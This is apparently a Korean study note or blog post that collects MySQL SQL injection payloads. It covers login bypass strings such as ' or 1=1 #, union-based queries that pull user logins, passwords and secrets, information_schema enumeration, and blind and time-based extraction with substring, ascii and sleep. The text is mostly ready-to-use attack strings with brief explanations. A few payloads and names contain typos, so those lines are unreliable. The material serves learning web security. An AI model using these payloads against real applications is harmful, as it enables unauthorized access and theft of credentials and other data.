---
title: SQL Injection 
date: 2020-11-15 19:49:08
tags:
- SQL Injection
category:
- Web
---

## SQL Injection

### 인증 우회

- 인증 쿼리 질의문
`Select * from members where id='' and pass=''`

- `' or 1=1 #`
- `' or 'x'='x`
- `" or "x"="x`
- `') or ('x'='x`
- `") or ("x"="x`

### Error Based

- `0' union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#`
- `0' union select all 1,2,3,4,5 #` 
- `' union select all 1,2,3,4,5,6,7,8,9,10,11#`
- `' union select all 1,2,database(),4,5,6,7#`
- `' union select all 1,2,table_name,4,5,6,7,8 from information_schema.tables#`
- `' union select all 1,2,column_name,4,5,6 from information_schema.columns where table_name='users'#`
- `' order by 10#` : 컬럼 개수 알아내기 컬럼 개수가 크면 에러가 나온다

UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. 

### Blind 

- `' or 1=1 and length(database())=5#`
- `' or 1=1= and substring(database(),1,1)='b'#`
- `' or 1=1 and ascii(substring(database(),1,1))=98#`

'참'과 '거짓'의 결과만으로 결과를 얻어낸다.

### Time Based

- `' or 1=1 and sleep(5)#`

sleep()함수를 이용해서 시간을 비교해서 원하는 결과를 얻는 방법, 하지만 시간도 많이 걸리고 제일 마지막에 시도하는 방법이다.


## SQL Injection Cheat Sheet

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

## My SQL Injection에 기본적으로 알아야 할 것들

- @@version
- information_schema.tables
  - table_name
- information_shcema.columns
  - column_name
- database()
- length()
- substring(문자열,시작,개수)
- ascii()
- limit 시작,개수 : 컬럼을 하나씩 가져오기위해 사용


